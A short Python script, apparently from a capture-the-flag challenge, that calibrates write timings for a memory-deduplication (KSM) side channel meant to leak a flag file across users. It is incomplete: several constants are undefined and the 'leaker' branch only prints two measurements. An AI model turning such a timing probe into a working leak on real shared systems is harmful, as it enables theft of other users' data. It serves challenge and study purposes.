# This script can be used to figure out/verify the timings
import mmap
from time import time_ns

WAIT_KSM = 0x10000


TEST = 3
mm_leak = mmap.mmap(-1,0x1000, flags=0x22, prot=2)
mm_leak.madvise(12)

def mysleep():
    for i in range(WAIT_KSM):
        pass

def measure(mm, c):
    mm[0] = c
    mysleep()
    t_start = time_ns()
    mm[0] = TEST
    t_end = time_ns()
    return t_end - t_start


def wait_synced(mm, sync_word):
    while True:
        hits = 0
        for i in range(N_ROUNDS):
            if measure(mm, sync_word) > THRESH:
                hits += 1
        if hits == N_ROUNDS:
            break

# leaker
sync_word = 0
if FLAG == b'The flag is stored at /home/user2/flag.txt!':
    print("Starting...to leak")
    leaked_flag = ''
    print(str(measure(mm_leak, 0x42)))
    print(str(measure(mm_leak, 0x41)))

    print("Done?")

    while True:
        pass

else:
    print("What?")
    mm_leak[0] = 'A'
    while True:
        pass


EOF
